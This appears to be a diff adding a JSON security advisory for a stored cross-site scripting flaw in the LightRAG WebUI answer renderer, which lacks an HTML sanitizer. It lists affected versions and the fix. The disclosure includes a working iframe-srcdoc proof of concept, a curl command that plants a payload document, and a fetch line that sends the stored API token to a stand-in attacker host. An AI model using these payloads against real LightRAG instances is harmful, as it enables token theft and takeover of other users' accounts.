@@ -1,0 +1,153 @@
+{
+  "id": "GHSA-xpjq-3w4w-w5wr",
+  "modified": "2026-09-22T21:00:09.906725468Z",
+  "published": "2026-09-22T20:40:27Z",
+  "aliases": [
+    "CVE-2026-86062"
+  ],
+  "summary": "lightrag-hku: Stored Cross-Site Scripting (XSS) in the LightRAG WebUI chat/answer renderer via ingested content",
+  "details": "### Summary\nThe LightRAG WebUI renders assistant/answer chat content as **raw HTML** — `react-markdown` is\nconfigured with `rehypePlugins={[rehypeRaw]}` and `skipHtml={false}` and **no** HTML sanitizer\n(`rehype-sanitize`), element allow-list, or custom `urlTransform`. Because answer content is derived\nfrom user-ingested documents, an attacker who can add a single document can store an HTML/JavaScript\npayload that executes in the browser of any user who later retrieves it (typically an administrator),\nleading to auth-token theft from `localStorage` and full API takeover. No authentication is required in\nthe default configuration.\n\n### Details\nSink — `lightrag_webui/src/components/retrieval/ChatMessage.tsx`:\n- Main answer (`MessageMarkdown`, lines ~348-351) and thinking content (lines ~252-272) render with\n  `rehypePlugins={[rehypeRaw, …]}` and `skipHtml={false}`. The `components` map (lines ~111-156) only\n  restyles safe formatting tags (`p`, `h1`–`h4`, `ul`, `ol`, `li`, `code`); there is no\n  `rehype-sanitize`, no `allowedElements`/`disallowedElements`, and no custom `urlTransform`.\n- Second sink: mermaid is initialized with `securityLevel: 'loose'` (line ~433) and the rendered SVG is\n  injected via `container.innerHTML = svg` (line ~483) + `bindFunctions(container)`. `'loose'` disables\n  mermaid's output sanitization, so a ` ```mermaid ` block in answer content (HTML label / `click`\n  directive) is an additional script-execution path.\n- Hardening (not code execution): KaTeX is set with `trust: true` (lines ~261/~359). `\\href{javascript:…}`\n  is blocked by React 19, but `\\includegraphics{URL}` renders a live remote `\u003cimg src\u003e` (arbitrary\n  external resource load from the victim's browser). Recommend `trust: false`.\n\nSource → sink:\n`POST /documents/text` or `POST /documents/upload` stores the document → `POST /query` returns it\n(verbatim when `only_need_context=true`, `lightrag/api/routers/query_routes.py:27`; otherwise echoed by\nthe LLM) → the response is streamed into `assistantMessage.content`\n(`lightrag_webui/src/features/RetrievalView.tsx:340`) → rendered by the sink above.\n\nreact-markdown's built-in defenses do NOT cover this: it sanitizes `href`/`src` URLs (so `javascript:`\nlinks are blocked) and React ignores string event handlers (so `\u003cimg onerror\u003e` is dropped), but raw\nelements such as `\u003ciframe srcdoc=\"…\"\u003e` and `\u003csvg\u003e\u003cscript\u003e` are rendered unchanged and execute.\n\n### PoC\nBenign, local-only. Tested at commit `f3378a3` (v1.5.5) with `react@19`, `react-markdown@10.1.0`,\n`rehype-raw@7.0.0`.\n\n**Fastest check (code review, ~10s):** in `ChatMessage.tsx`, the `\u003cReactMarkdown\u003e` that renders answers\nuses `rehypePlugins={[rehypeRaw, …]}` with `skipHtml={false}` and no `rehype-sanitize` / allow-list.\nPer react-markdown's own documentation, `rehype-raw` on untrusted input without `rehype-sanitize`\nallows HTML injection — that is the vulnerability.\n\n**Runnable proof (~2 min) — reproduces the exact renderer config and shows it execute in a browser:**\n```bash\nmkdir xss-check \u0026\u0026 cd xss-check\nnpm init -y\nnpm install react@19 react-dom@19 react-markdown@10 rehype-raw@7\n# save the script below as poc.mjs, then:\nnode poc.mjs\n# open the generated poc.html in any browser (or headless):\n#   msedge --headless=new --dump-dom \"file:///ABS/PATH/poc.html\"\n```\n`poc.mjs`:\n```js\nimport React from 'react';\nimport { renderToStaticMarkup } from 'react-dom/server';\nimport ReactMarkdown from 'react-markdown';\nimport rehypeRaw from 'rehype-raw';\nimport { writeFileSync } from 'fs';\n\n// Stands in for an assistant answer built from an ingested document.\nconst answer =\n  `\u003ciframe srcdoc=\"\u003cscript\u003e` +\n  `var h=parent.document.createElement('h1');h.style.color='red';` +\n  `h.textContent='XSS EXECUTED on '+(parent.document.domain||'this page');` +\n  `parent.document.body.appendChild(h);parent.document.title='XSS-EXECUTED';` +\n  `\u003c\\/script\u003e\"\u003e\u003c/iframe\u003e`;\n\n// EXACT options from ChatMessage.tsx (rehypeRaw + skipHtml:false, no sanitizer):\nconst body = renderToStaticMarkup(\n  React.createElement(ReactMarkdown, { rehypePlugins: [rehypeRaw], skipHtml: false }, answer)\n);\nwriteFileSync('poc.html', `\u003c!doctype html\u003e\u003ctitle\u003ebefore-xss\u003c/title\u003e\u003cbody\u003e${body}\u003c/body\u003e`);\nconsole.log(body);   // note the LIVE \u003ciframe srcDoc=\"...\"\u003e — not HTML-escaped\n```\n\n**Observed** (verified in headless Chromium/Edge): the injected `srcdoc` script runs — the page title\nbecomes `XSS-EXECUTED` and a red \"XSS EXECUTED on this page\" heading is appended to the document. This\nconfirms attacker HTML in answer content executes. (Separately: `\u003cscript\u003e`, `\u003csvg\u003e\u003cscript\u003e`, and\n`\u003ciframe srcdoc\u003e` survive rendering; `\u003cimg onerror\u003e` and `javascript:` links are neutralized by React /\nreact-markdown, so `\u003ciframe srcdoc\u003e` is the reliable vector.)\n\n**Illustrative end-to-end source path (in a live instance):**\n```bash\ncurl -X POST http://127.0.0.1:9621/documents/text \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"text\":\"\u003ciframe srcdoc=\\\"\u0026lt;script\u0026gt;document.title=document.domain\u0026lt;/script\u0026gt;\\\"\u003e\u003c/iframe\u003e\",\"file_source\":\"note.md\"}'\n```\nThen query the knowledge base from the WebUI (or `POST /query` with `only_need_context=true`); the stored\npayload renders and the benign marker script runs in the viewer's browser (the page title becomes the\norigin). A real attacker replaces the benign marker with\n`fetch('//attacker/?t='+localStorage.getItem('LIGHTRAG-API-TOKEN'))` to exfiltrate the victim's JWT\n(verified storage key) and impersonate them against the API.\n\n### Impact\nStored (persistent) cross-site scripting. Any user in the default no-auth deployment, or any\nauthenticated low-privilege collaborator when auth is enabled, can plant a document whose content runs\narbitrary JavaScript in the browser of every user who later retrieves it. Because LightRAG keeps the\nauth token in `localStorage`, the injected script can read it and drive the API as the victim\n(exfiltrate/modify/delete the knowledge base and graph, upload documents) — i.e. escalate to full\naccount/instance takeover.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lightrag-hku",
+        "purl": "pkg:pypi/lightrag-hku"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.0.9",
+        "1.0.0",
+        "1.0.1",
+        "1.0.3",
+        "1.0.5",
+        "1.0.6",
+        "1.0.8",
+        "1.0.9",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.1.3",
+        "1.1.4",
+        "1.1.5",
+        "1.1.6",
+        "1.1.7",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.2.5",
+        "1.2.6",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.3.5",
+        "1.3.6",
+        "1.3.7",
+        "1.3.8",
+        "1.3.9",
+        "1.4.0",
+        "1.4.1",
+        "1.4.10",
+        "1.4.11",
+        "1.4.11rc2",
+        "1.4.12",
+        "1.4.12rc1",
+        "1.4.13",
+        "1.4.13rc1",
+        "1.4.14",
+        "1.4.15",
+        "1.4.16",
+        "1.4.2",
+        "1.4.3",
+        "1.4.4",
+        "1.4.5",
+        "1.4.6",
+        "1.4.7",
+        "1.4.8.1",
+        "1.4.8.2",
+        "1.4.8rc4",
+        "1.4.8rc6",
+        "1.4.8rc7",
+        "1.4.8rc8",
+        "1.4.8rc9",
+        "1.4.9",
+        "1.4.9.1",
+        "1.4.9.10",
+        "1.4.9.11",
+        "1.4.9.2",
+        "1.4.9.3",
+        "1.4.9.4",
+        "1.4.9.4rc1",
+        "1.4.9.5",
+        "1.4.9.6",
+        "1.4.9.7",
+        "1.4.9.8",
+        "1.4.9.9",
+        "1.4.9rc1",
+        "1.4.9rc2",
+        "1.4.9rc3",
+        "1.4.9rc4",
+        "1.5.0",
+        "1.5.0rc1",
+        "1.5.0rc2",
+        "1.5.0rc3",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.5.4",
+        "1.5.5rc1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.5.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-xpjq-3w4w-w5wr/GHSA-xpjq-3w4w-w5wr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/security/advisories/GHSA-xpjq-3w4w-w5wr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86062"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/pull/3437"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/commit/8bf032a5200f293b482dd945d436e25cd08bd953"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HKUDS/LightRAG"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/releases/tag/v1.5.5"
+    }
+  ]
+}
